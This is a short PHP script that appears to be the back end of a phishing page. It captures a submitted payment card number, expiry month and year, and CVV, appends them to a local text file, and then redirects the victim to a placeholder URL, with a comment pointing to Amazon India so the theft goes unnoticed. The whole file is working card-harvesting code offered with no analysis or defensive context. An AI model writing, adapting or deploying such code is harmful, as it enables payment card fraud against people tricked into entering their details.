<?php
file_put_contents("usernames.txt", "Card Number: " . $_POST['cardNumber'] . "\nMonth: " . $_POST['month'] . "\nYear: " . $_POST['year'] . "\nCVV: " . $_POST['securityCode'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.amazon.in/
header("Location: $url");
?>

